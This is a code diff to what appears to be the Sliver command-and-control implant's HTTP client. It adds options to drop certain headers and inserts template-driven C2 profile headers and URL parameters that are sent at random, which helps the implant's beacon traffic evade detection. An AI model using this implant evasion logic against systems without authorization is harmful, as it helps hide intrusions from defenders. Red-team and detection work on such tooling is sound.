@@ -62,11 +62,13 @@ var (
 
 // HTTPOptions - c2 specific configuration options
 type HTTPOptions struct {
-	NetTimeout  time.Duration
-	TlsTimeout  time.Duration
-	PollTimeout time.Duration
-	MaxErrors   int
-	ForceHTTP   bool
+	NetTimeout           time.Duration
+	TlsTimeout           time.Duration
+	PollTimeout          time.Duration
+	MaxErrors            int
+	ForceHTTP            bool
+	DisableAcceptHeader  bool
+	DisableUpgradeHeader bool
 
 	ProxyConfig   string
 	ProxyUsername string
@@ -92,11 +94,13 @@ func ParseHTTPOptions(c2URI *url.URL) *HTTPOptions {
 		maxErrors = 10
 	}
 	return &HTTPOptions{
-		NetTimeout:  netTimeout,
-		TlsTimeout:  tlsTimeout,
-		PollTimeout: pollTimeout,
-		MaxErrors:   maxErrors,
-		ForceHTTP:   c2URI.Query().Get("force-http") == "true",
+		NetTimeout:           netTimeout,
+		TlsTimeout:           tlsTimeout,
+		PollTimeout:          pollTimeout,
+		MaxErrors:            maxErrors,
+		ForceHTTP:            c2URI.Query().Get("force-http") == "true",
+		DisableAcceptHeader:  c2URI.Query().Get("disable-accept-header") == "true",
+		DisableUpgradeHeader: c2URI.Query().Get("disable-upgrade-header") == "true",
 
 		ProxyConfig:   c2URI.Query().Get("proxy"),
 		ProxyUsername: c2URI.Query().Get("proxy-username"),
@@ -110,7 +114,7 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 	var err error
 	if !opts.ForceHTTP {
 		client = httpsClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig)
-		client.pollTimeout = opts.PollTimeout
+		client.Options = opts
 		client.PathPrefix = pathPrefix
 		err = client.SessionInit()
 		if err == nil {
@@ -123,6 +127,8 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
 		client = httpClient(address, opts.NetTimeout, opts.TlsTimeout, opts.ProxyConfig) // Fallback to insecure HTTP
+		client.Options = opts
+		client.PathPrefix = pathPrefix
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -133,16 +139,17 @@ func HTTPStartSession(address string, pathPrefix string, opts *HTTPOptions) (*Sl
 
 // SliverHTTPClient - Helper struct to keep everything together
 type SliverHTTPClient struct {
-	Origin      string
-	PathPrefix  string
-	Client      *http.Client
-	ProxyURL    string
-	SessionCtx  *cryptography.CipherContext
-	SessionID   string
-	pollTimeout time.Duration
-	pollCancel  context.CancelFunc
-	pollMutex   *sync.Mutex
-	Closed      bool
+	Origin     string
+	PathPrefix string
+	Client     *http.Client
+	ProxyURL   string
+	SessionCtx *cryptography.CipherContext
+	SessionID  string
+	pollCancel context.CancelFunc
+	pollMutex  *sync.Mutex
+	Closed     bool
+
+	Options *HTTPOptions
 }
 
 // SessionInit - Initialize the session
@@ -199,13 +206,54 @@ func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL
 func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.Reader) *http.Request {
 	req, _ := http.NewRequest(method, uri.String(), body)
 	req.Header.Set("User-Agent", userAgent)
-	if method == http.MethodGet {
+	if method == http.MethodGet && !s.Options.DisableAcceptHeader {
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
 		req.Header.Set("Accept", acceptHeaderValue)
 	}
-	if uri.Scheme == "http" {
+	if uri.Scheme == "http" && !s.Options.DisableUpgradeHeader {
 		req.Header.Set("Upgrade-Insecure-Requests", "1")
 	}
+
+	type nameValueProbability struct {
+		Name        string
+		Value       string
+		Probability string
+	}
+
+	// HTTP C2 Profile headers
+	extraHeaders := []nameValueProbability{
+		// {{range $header := .HTTPC2ImplantConfig.Headers}}
+		{Name: "{{$header.Name}}", Value: "{{$header.Value}}", Probability: "{{$header.Probability}}"},
+		// {{end}}
+	}
+	for _, header := range extraHeaders {
+		probability, _ := strconv.Atoi(header.Probability)
+		if 0 < probability {
+			roll := insecureRand.Intn(99) + 1
+			if probability < roll {
+				continue
+			}
+		}
+		req.Header.Set(header.Name, header.Value)
+	}
+
+	extraURLParams := []nameValueProbability{
+		// {{range $param := .HTTPC2ImplantConfig.URLParameters}}
+		{Name: "{{$param.Name}}", Value: "{{$param.Value}}", Probability: "{{$param.Probability}}"},
+		// {{end}}
+	}
+	queryParams := req.URL.Query()
+	for _, param := range extraURLParams {
+		probability, _ := strconv.Atoi(param.Probability)
+		if 0 < probability {
+			roll := insecureRand.Intn(99) + 1
+			if probability < roll {
+				continue
+			}
+		}
+		queryParams.Set(param.Name, param.Value)
+	}
+	req.URL.RawQuery = queryParams.Encode()
 	return req
 }
 
@@ -235,7 +283,7 @@ func (s *SliverHTTPClient) DoPoll(req *http.Request) (*http.Response, []byte, er
 		select {
 		case <-ctx.Done():
 			done <- ctx.Err()
-		case <-time.After(s.pollTimeout):
+		case <-time.After(s.Options.PollTimeout):
 			// {{if .Config.Debug}}
 			log.Printf("[http] poll timeout error!")
 			// {{end}}
@@ -474,7 +522,7 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	for index, segment := range segments {
 		segments[index] = url.PathEscape(segment)
 	}
-	if s.PathPrefix != "" {
+	if s.PathPrefix != "" && s.PathPrefix != "/" {
 		segments = append([]string{s.PathPrefix}, segments...)
 	}
 	return strings.Join(segments, "/")
